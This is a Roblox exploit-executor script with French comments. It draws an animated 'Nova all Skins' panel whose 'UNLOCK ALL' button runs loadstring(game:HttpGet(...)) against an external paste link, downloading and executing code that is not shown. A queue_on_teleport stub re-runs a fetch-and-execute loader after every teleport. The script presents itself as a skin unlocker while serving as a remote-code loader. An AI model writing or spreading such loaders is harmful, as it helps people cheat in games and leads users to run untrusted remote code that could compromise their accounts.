-- This file was generated at discord.gg/syncrypt

if autoload == nil then
	autoload = true
end
if autoleave == nil then
	autoleave = true
end
pcall(function()
	if not autoload then
		return
	end

	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "NovaPanel"
	ScreenGui.Parent = game.CoreGui
	ScreenGui.ResetOnSpawn = false
	ScreenGui.IgnoreGuiInset = true

	------------------------------------------------------------
	-- FENÊTRE PRINCIPALE (noir & blanc, sans UICorner)
	------------------------------------------------------------
	local Frame = Instance.new("Frame")
	Frame.Size = UDim2.new(0, 340, 0, 210)
	Frame.Position = UDim2.new(0.5, -170, 0.5, -105)
	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BackgroundTransparency = 0
	Frame.BorderSizePixel = 0
	Frame.Parent = ScreenGui
	Frame.ClipsDescendants = false

	-- État initial pour l'animation d'ouverture
	Frame.Size = UDim2.new(0, 0, 0, 0)
	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame.BackgroundTransparency = 1

	-- Dégradé animé noir/blanc sur le fond
	local FrameGradient = Instance.new("UIGradient")
	FrameGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(60, 60, 60)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0)),
	})
	FrameGradient.Rotation = 45
	FrameGradient.Parent = Frame

	task.spawn(function()
		while Frame.Parent do
			TweenService:Create(FrameGradient, TweenInfo.new(3, Enum.EasingStyle.Linear), {Rotation = FrameGradient.Rotation + 360}):Play()
			task.wait(3)
		end
	end)

	-- Particules sur la fenêtre
	local FrameParticles = Instance.new("ParticleEmitter")
	FrameParticles.Texture = "rbxassetid://243660364"
	FrameParticles.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
	})
	FrameParticles.Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0),
		NumberSequenceKeypoint.new(0.5, 0.35),
		NumberSequenceKeypoint.new(1, 0),
	})
	FrameParticles.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.5, 0.4),
		NumberSequenceKeypoint.new(1, 1),
	})
	FrameParticles.Lifetime = NumberRange.new(2, 4)
	FrameParticles.Rate = 12
	FrameParticles.Speed = NumberRange.new(10, 30)
	FrameParticles.SpreadAngle = Vector2.new(180, 180)
	FrameParticles.EmissionDirection = Enum.NormalId.Top
	FrameParticles.Parent = Frame

	------------------------------------------------------------
	-- TITRE
	------------------------------------------------------------
	local TextLabel = Instance.new("TextLabel")
	TextLabel.Size = UDim2.new(1, 0, 0, 40)
	TextLabel.Position = UDim2.new(0, 0, 0, 0)
	TextLabel.Text = "Nova all Skins"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 20
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BackgroundTransparency = 0.15
	TextLabel.BorderSizePixel = 0
	TextLabel.Parent = Frame

	local TitleGradient = Instance.new("UIGradient")
	TitleGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
	})
	TitleGradient.Rotation = 0
	TitleGradient.Parent = TextLabel

	task.spawn(function()
		while TextLabel.Parent do
			TweenService:Create(TitleGradient, TweenInfo.new(2.5, Enum.EasingStyle.Linear), {Offset = Vector2.new(1, 0)}):Play()
			task.wait(2.5)
			TitleGradient.Offset = Vector2.new(-1, 0)
		end
	end)

	------------------------------------------------------------
	-- BOUTON FERMER
	------------------------------------------------------------
	local CloseBtn = Instance.new("TextButton")
	CloseBtn.Size = UDim2.new(0, 30, 0, 30)
	CloseBtn.Position = UDim2.new(1, -35, 0, 5)
	CloseBtn.Text = "X"
	CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBtn.TextSize = 16
	CloseBtn.Font = Enum.Font.GothamBold
	CloseBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	CloseBtn.BorderSizePixel = 0
	CloseBtn.Parent = Frame

	local CloseGradient = Instance.new("UIGradient")
	CloseGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
	})
	CloseGradient.Rotation = 45
	CloseGradient.Parent = CloseBtn

	CloseBtn.MouseEnter:Connect(function()
		TweenService:Create(CloseBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
		TweenService:Create(CloseBtn, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(0, 0, 0)}):Play()
	end)
	CloseBtn.MouseLeave:Connect(function()
		TweenService:Create(CloseBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()
		TweenService:Create(CloseBtn, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
	end)

	------------------------------------------------------------
	-- BOUTON PRINCIPAL
	------------------------------------------------------------
	local MainBtn = Instance.new("TextButton")
	MainBtn.Size = UDim2.new(0, 180, 0, 60)
	MainBtn.Position = UDim2.new(0.5, -90, 0.5, -25)
	MainBtn.Text = "UNLOCK ALL"
	MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	MainBtn.TextSize = 18
	MainBtn.Font = Enum.Font.GothamBold
	MainBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	MainBtn.BorderSizePixel = 0
	MainBtn.Parent = Frame

	local BtnGradient = Instance.new("UIGradient")
	BtnGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(90, 90, 90)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0)),
	})
	BtnGradient.Rotation = 90
	BtnGradient.Parent = MainBtn

	task.spawn(function()
		while MainBtn.Parent do
			TweenService:Create(BtnGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Rotation = BtnGradient.Rotation + 360}):Play()
			task.wait(2)
		end
	end)

	local BtnParticles = Instance.new("ParticleEmitter")
	BtnParticles.Texture = "rbxassetid://243660364"
	BtnParticles.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
	})
	BtnParticles.Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0),
		NumberSequenceKeypoint.new(0.5, 0.25),
		NumberSequenceKeypoint.new(1, 0),
	})
	BtnParticles.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.5, 0.5),
		NumberSequenceKeypoint.new(1, 1),
	})
	BtnParticles.Lifetime = NumberRange.new(1, 2)
	BtnParticles.Rate = 20
	BtnParticles.Speed = NumberRange.new(5, 20)
	BtnParticles.SpreadAngle = Vector2.new(180, 180)
	BtnParticles.Parent = MainBtn

	MainBtn.MouseEnter:Connect(function()
		TweenService:Create(MainBtn, TweenInfo.new(0.25), {Size = UDim2.new(0, 195, 0, 65), Position = UDim2.new(0.5, -97, 0.5, -27)}):Play()
	end)
	MainBtn.MouseLeave:Connect(function()
		TweenService:Create(MainBtn, TweenInfo.new(0.25), {Size = UDim2.new(0, 180, 0, 60), Position = UDim2.new(0.5, -90, 0.5, -25)}):Play()
	end)

	MainBtn.MouseButton1Click:Connect(function()
		MainBtn.Text = "UNLOCKED!"
		TweenService:Create(MainBtn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
		TweenService:Create(MainBtn, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(0, 0, 0)}):Play()
		loadstring(game:HttpGet("https://pastefy.app/INrEED7Z/raw", true))()
	end)

	------------------------------------------------------------
	-- ANIMATION D'OUVERTURE
	------------------------------------------------------------
	local openTween = TweenService:Create(
		Frame,
		TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
		{
			Size = UDim2.new(0, 340, 0, 210),
			Position = UDim2.new(0.5, -170, 0.5, -105),
			BackgroundTransparency = 0,
		}
	)
	openTween:Play()

	------------------------------------------------------------
	-- ANIMATION DE FERMETURE
	------------------------------------------------------------
	local isClosing = false
	local function closePanel()
		if isClosing then return end
		isClosing = true
		FrameParticles.Enabled = false
		BtnParticles.Enabled = false
		local closeTween = TweenService:Create(
			Frame,
			TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In),
			{
				Size = UDim2.new(0, 0, 0, 0),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				BackgroundTransparency = 1,
			}
		)
		closeTween:Play()
		closeTween.Completed:Connect(function()
			ScreenGui:Destroy()
		end)
	end

	CloseBtn.MouseButton1Click:Connect(closePanel)

	------------------------------------------------------------
	-- UI DRAG (déplacement de la fenêtre)
	------------------------------------------------------------
	local dragging = false
	local dragStart, startPos

	TextLabel.Active = true
	TextLabel.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = Frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			Frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)

	print("Nova panel chargé")

	if autoleave then
		queue_on_teleport("            pcall(function()\n                autoload = true;\n                autoleave = true;\n                loadstring(game:HttpGet(\"script\"))() -- Met le lien de ton script ici\n            end)\n        ")
	end
end)
